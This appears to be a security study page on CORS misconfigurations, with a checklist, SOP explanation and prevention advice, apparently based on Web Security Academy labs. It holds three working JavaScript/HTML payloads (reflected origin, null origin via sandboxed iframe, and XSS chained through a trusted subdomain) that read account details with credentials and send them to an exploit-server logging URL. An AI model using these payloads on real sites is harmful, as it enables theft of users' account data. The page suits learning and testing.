# Cross-Origin Resource Sharing (CORS)

Cross-Origin Resource Sharing (CORS) is a browser security feature that allows a web page from one domain (the "origin") to access resources on another domain. It is an extension of the Same-Origin Policy (SOP) and provides a way to relax its restrictions in a controlled manner.

While CORS adds flexibility, a misconfigured policy can open the door to cross-domain attacks. It is important to note that **CORS is not a protection against Cross-Site Request Forgery (CSRF)**.

## TL;DR Checks

- [ ] Check if arbitrary origins are reflected in the `Access-Control-Allow-Origin` response header
- [ ] Check if `Access-Control-Allow-Credentials` is set to `true`
- [ ] Check if null origin is reflected
- [ ] Try different variations to see if there are any parsing errors
	- [ ] subdomain.target.com
	- [ ] target.com.evil.com
	- [ ] eviltarget.com
- [ ] Check if insecure origins are allowed

## Same-Origin Policy (SOP)

The Same-Origin Policy is a fundamental security mechanism that restricts how a document or script loaded from one **origin** can interact with a resource from another origin.

An "origin" is defined by the combination of the **protocol** (e.g., `http`, `https`), **hostname** (e.g., `www.example.com`), and **port** (e.g., `80`, `443`). If all three match, the origins are the same.

**Example:**
If a page is loaded from `https://www.example.com`, the following table shows which URLs it can and cannot access data from according to the SOP:

| URL | Same Origin? | Reason |
| :--- | :---: | :--- |
| `https://www.example.com/page.html` | Yes | Same protocol, host, and port. |
| `http://www.example.com` | No | Different protocol (HTTP vs. HTTPS). |
| `https://store.example.com` | No | Different hostname (subdomain). |
| `https://www.example.com:8080` | No | Different port. |

??? tip "What does the SOP do?"
	The SOP generally allows a domain to *send* requests to other domains, but it prevents the requesting domain from *reading* the responses.

## How CORS Works

CORS allows servers to explicitly specify which origins are permitted to access their resources. This is done through HTTP headers.

- **`Access-Control-Allow-Origin`:** This is the most important CORS header. The server includes this header in its response to indicate which origins are allowed. For example:

```http
Access-Control-Allow-Origin: https://www.trusted-site.com
```

A wildcard (`*`) can be used, but this is often insecure as it allows any domain to access the resource.

- **`Access-Control-Allow-Credentials: true`**: Indicates cross-origin requests can include cookies.  

- **Preflight Requests:** For requests that can modify data (e.g., `PUT`, `DELETE`) or use certain headers, the browser first sends a "preflight" request using the `OPTIONS` method. This request checks if the server understands and approves the actual request. If the server responds favorably to the `OPTIONS` request, the browser then sends the actual request.

Payload for basic arbitrary origin reflected:

```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://0a6300590490f183806703ee00fc00ea.web-security-academy.net/accountDetails',true); 
req.withCredentials = true;
req.send();

function reqListener() {
	location='//exploit-0a6500ab0499f17080cb0247015a00ab.exploit-server.net/log?key='+this.responseText; 
};
```

## Whilelisted NULL origin value

The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

Sample payload for `NULL` origin:

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html, <script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://0adb00af04759e1980f703df00da0006.web-security-academy.net/accountDetails',true);
  req.withCredentials = true;
  req.send();

  function reqListener() {
	location='https://exploit-0a310064045b9e858037027701af008a.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
   };
</script>"></iframe> 
```

## Exploiting XSS via CORS Trust Relationships

If the vulnerable site trusts an origin that is vulnerable to XSS, then the attacker might be able to inject JavaScript on the *trusted* site that uses CORS to steal sensitive information from the *trusting* site. 

Example payload when there's an XSS on a trusted site:

```html
<script>
document.location="http://stock.0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a57008a0318110c80fb1cc3005200c7.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ac4000c033411d480bf1bcb01920034.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

## Breaking TLS with Poorly Configured CORS

Be sure to check if CORS accepts insecure `http` sites. 

## Preventing CORS Misconfigurations

- If a web resource contains sensitive information, the origin should be properly specified in the `Access-Control-Allow-Origin` header. 
- Do not dynamically reflect arbitrary origins in the ACAO header.
- Avoid whitelisting `null` origins. 
- Avoid using wildcards on internal networks. Trusting network configuration alone to protect internal resources is not sufficient when internal browsers can access untrusted external domains.

??? warning "NOTE"
	CORS defines browser behaviors and is never a replacement for server-side protection of sensitive data - an attacker can directly forge a request from any trusted origin. Therefore, web servers should continue to apply protections over sensitive data, such as authentication and session management, in addition to properly configured CORS.








